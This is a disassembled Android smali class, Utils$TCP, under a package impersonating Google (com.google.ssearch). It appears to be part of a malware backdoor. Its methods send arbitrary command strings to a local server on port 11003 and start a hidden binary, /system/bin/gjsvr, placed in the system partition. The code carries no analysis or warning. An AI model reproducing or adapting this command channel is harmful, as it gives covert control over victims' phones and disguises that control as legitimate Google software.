.class public Lcom/google/ssearch/Utils$TCP;
.super Ljava/lang/Object;
.source "Utils.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/google/ssearch/Utils;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x9
    name = "TCP"
.end annotation


# static fields
.field public static final PORT:I = 0x2afb

.field public static final SERVER:Ljava/lang/String; = "localhost"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 446
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static execute(Ljava/lang/String;)Z
    .locals 10
    .param p0, "cmd"    # Ljava/lang/String;

    .prologue
    .line 474
    const/4 v6, 0x0

    .line 475
    .local v6, "sk":Ljava/net/Socket;
    const/4 v5, 0x0

    .line 478
    .local v5, "result":Z
    :try_start_0
    new-instance v7, Ljava/net/Socket;

    const-string v8, "localhost"

    const/16 v9, 0x2afb

    invoke-direct {v7, v8, v9}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 479
    .end local v6    # "sk":Ljava/net/Socket;
    .local v7, "sk":Ljava/net/Socket;
    if-eqz v7, :cond_2

    .line 480
    :try_start_1
    invoke-virtual {v7}, Ljava/net/Socket;->isConnected()Z

    move-result v8

    if-nez v8, :cond_0

    .line 481
    const-string v8, "localhost"

    invoke-static {v8}, Ljava/net/InetAddress;->getByName(Ljava/lang/String;)Ljava/net/InetAddress;

    move-result-object v0

    check-cast v0, Ljava/net/Inet4Address;

    .line 482
    .local v0, "addr":Ljava/net/Inet4Address;
    new-instance v8, Ljava/net/InetSocketAddress;

    const/16 v9, 0x2afb

    invoke-direct {v8, v0, v9}, Ljava/net/InetSocketAddress;-><init>(Ljava/net/InetAddress;I)V

    const v9, 0xc350

    invoke-virtual {v7, v8, v9}, Ljava/net/Socket;->connect(Ljava/net/SocketAddress;I)V

    .line 485
    .end local v0    # "addr":Ljava/net/Inet4Address;
    :cond_0
    invoke-virtual {v7}, Ljava/net/Socket;->isConnected()Z

    move-result v8

    if-eqz v8, :cond_2

    .line 486
    invoke-virtual {v7}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v4

    .line 487
    .local v4, "os":Ljava/io/OutputStream;
    invoke-virtual {v7}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v3

    .line 488
    .local v3, "is":Ljava/io/InputStream;
    if-eqz v4, :cond_1

    .line 489
    invoke-virtual {p0}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    .line 490
    .local v1, "cmdByte":[B
    invoke-virtual {v4, v1}, Ljava/io/OutputStream;->write([B)V

    .line 491
    invoke-virtual {v4}, Ljava/io/OutputStream;->flush()V

    .line 492
    invoke-virtual {v4}, Ljava/io/OutputStream;->close()V

    .line 494
    .end local v1    # "cmdByte":[B
    :cond_1
    if-eqz v3, :cond_2

    .line 495
    const-wide/16 v8, 0x1388

    invoke-static {v8, v9}, Landroid/os/SystemClock;->sleep(J)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_4
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 496
    const/4 v5, 0x1

    .line 503
    .end local v3    # "is":Ljava/io/InputStream;
    .end local v4    # "os":Ljava/io/OutputStream;
    :cond_2
    if-eqz v7, :cond_5

    :try_start_2
    invoke-virtual {v7}, Ljava/net/Socket;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    move-object v6, v7

    .line 506
    .end local v7    # "sk":Ljava/net/Socket;
    .restart local v6    # "sk":Ljava/net/Socket;
    :cond_3
    :goto_0
    return v5

    .line 500
    :catch_0
    move-exception v8

    move-object v2, v8

    .line 501
    .local v2, "e":Ljava/io/IOException;
    :goto_1
    :try_start_3
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 503
    if-eqz v6, :cond_3

    :try_start_4
    invoke-virtual {v6}, Ljava/net/Socket;->close()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_0

    :catch_1
    move-exception v8

    goto :goto_0

    .line 502
    .end local v2    # "e":Ljava/io/IOException;
    :catchall_0
    move-exception v8

    .line 503
    :goto_2
    if-eqz v6, :cond_4

    :try_start_5
    invoke-virtual {v6}, Ljava/net/Socket;->close()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    .line 504
    :cond_4
    :goto_3
    throw v8

    .line 503
    .end local v6    # "sk":Ljava/net/Socket;
    .restart local v7    # "sk":Ljava/net/Socket;
    :catch_2
    move-exception v8

    move-object v6, v7

    .end local v7    # "sk":Ljava/net/Socket;
    .restart local v6    # "sk":Ljava/net/Socket;
    goto :goto_0

    :catch_3
    move-exception v9

    goto :goto_3

    .line 502
    .end local v6    # "sk":Ljava/net/Socket;
    .restart local v7    # "sk":Ljava/net/Socket;
    :catchall_1
    move-exception v8

    move-object v6, v7

    .end local v7    # "sk":Ljava/net/Socket;
    .restart local v6    # "sk":Ljava/net/Socket;
    goto :goto_2

    .line 500
    .end local v6    # "sk":Ljava/net/Socket;
    .restart local v7    # "sk":Ljava/net/Socket;
    :catch_4
    move-exception v8

    move-object v2, v8

    move-object v6, v7

    .end local v7    # "sk":Ljava/net/Socket;
    .restart local v6    # "sk":Ljava/net/Socket;
    goto :goto_1

    .end local v6    # "sk":Ljava/net/Socket;
    .restart local v7    # "sk":Ljava/net/Socket;
    :cond_5
    move-object v6, v7

    .end local v7    # "sk":Ljava/net/Socket;
    .restart local v6    # "sk":Ljava/net/Socket;
    goto :goto_0
.end method

.method public static isListened()Z
    .locals 7

    .prologue
    .line 452
    const/4 v3, 0x0

    .line 453
    .local v3, "sk":Ljava/net/Socket;
    const/4 v2, 0x0

    .line 455
    .local v2, "result":Z
    :try_start_0
    new-instance v4, Ljava/net/Socket;

    const-string v5, "localhost"

    const/16 v6, 0x2afb

    invoke-direct {v4, v5, v6}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 456
    .end local v3    # "sk":Ljava/net/Socket;
    .local v4, "sk":Ljava/net/Socket;
    if-eqz v4, :cond_3

    .line 457
    :try_start_1
    invoke-virtual {v4}, Ljava/net/Socket;->isConnected()Z

    move-result v5

    if-nez v5, :cond_0

    .line 458
    const-string v5, "localhost"

    invoke-static {v5}, Ljava/net/InetAddress;->getByName(Ljava/lang/String;)Ljava/net/InetAddress;

    move-result-object v0

    check-cast v0, Ljava/net/Inet4Address;

    .line 459
    .local v0, "addr":Ljava/net/Inet4Address;
    new-instance v5, Ljava/net/InetSocketAddress;

    const/16 v6, 0x2afb

    invoke-direct {v5, v0, v6}, Ljava/net/InetSocketAddress;-><init>(Ljava/net/InetAddress;I)V

    const v6, 0xc350

    invoke-virtual {v4, v5, v6}, Ljava/net/Socket;->connect(Ljava/net/SocketAddress;I)V

    .line 462
    .end local v0    # "addr":Ljava/net/Inet4Address;
    :cond_0
    invoke-virtual {v4}, Ljava/net/Socket;->isConnected()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_4
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    move-result v5

    if-eqz v5, :cond_1

    const/4 v2, 0x1

    .line 467
    :cond_1
    :goto_0
    if-eqz v4, :cond_5

    :try_start_2
    invoke-virtual {v4}, Ljava/net/Socket;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    move-object v3, v4

    .line 469
    .end local v4    # "sk":Ljava/net/Socket;
    .restart local v3    # "sk":Ljava/net/Socket;
    :cond_2
    :goto_1
    return v2

    .line 463
    .end local v3    # "sk":Ljava/net/Socket;
    .restart local v4    # "sk":Ljava/net/Socket;
    :cond_3
    const/4 v2, 0x1

    goto :goto_0

    .line 464
    .end local v4    # "sk":Ljava/net/Socket;
    .restart local v3    # "sk":Ljava/net/Socket;
    :catch_0
    move-exception v5

    move-object v1, v5

    .line 465
    .local v1, "e":Ljava/lang/Exception;
    :goto_2
    :try_start_3
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 467
    if-eqz v3, :cond_2

    :try_start_4
    invoke-virtual {v3}, Ljava/net/Socket;->close()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_1

    :catch_1
    move-exception v5

    goto :goto_1

    .line 466
    .end local v1    # "e":Ljava/lang/Exception;
    :catchall_0
    move-exception v5

    .line 467
    :goto_3
    if-eqz v3, :cond_4

    :try_start_5
    invoke-virtual {v3}, Ljava/net/Socket;->close()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    .line 468
    :cond_4
    :goto_4
    throw v5

    .line 467
    .end local v3    # "sk":Ljava/net/Socket;
    .restart local v4    # "sk":Ljava/net/Socket;
    :catch_2
    move-exception v5

    move-object v3, v4

    .end local v4    # "sk":Ljava/net/Socket;
    .restart local v3    # "sk":Ljava/net/Socket;
    goto :goto_1

    :catch_3
    move-exception v6

    goto :goto_4

    .line 466
    .end local v3    # "sk":Ljava/net/Socket;
    .restart local v4    # "sk":Ljava/net/Socket;
    :catchall_1
    move-exception v5

    move-object v3, v4

    .end local v4    # "sk":Ljava/net/Socket;
    .restart local v3    # "sk":Ljava/net/Socket;
    goto :goto_3

    .line 464
    .end local v3    # "sk":Ljava/net/Socket;
    .restart local v4    # "sk":Ljava/net/Socket;
    :catch_4
    move-exception v5

    move-object v1, v5

    move-object v3, v4

    .end local v4    # "sk":Ljava/net/Socket;
    .restart local v3    # "sk":Ljava/net/Socket;
    goto :goto_2

    .end local v3    # "sk":Ljava/net/Socket;
    .restart local v4    # "sk":Ljava/net/Socket;
    :cond_5
    move-object v3, v4

    .end local v4    # "sk":Ljava/net/Socket;
    .restart local v3    # "sk":Ljava/net/Socket;
    goto :goto_1
.end method

.method public static startListen()V
    .locals 2

    .prologue
    .line 511
    new-instance v0, Ljava/io/File;

    const-string v1, "/system/bin/gjsvr"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 512
    const-string v0, "/system/bin/gjsvr"

    const-string v1, ""

    invoke-static {v0, v1}, Lcom/google/ssearch/Utils;->runsh(Ljava/lang/String;Ljava/lang/String;)V

    .line 513
    const-wide/16 v0, 0x3e8

    invoke-static {v0, v1}, Landroid/os/SystemClock;->sleep(J)V

    .line 515
    :cond_0
    return-void
.end method
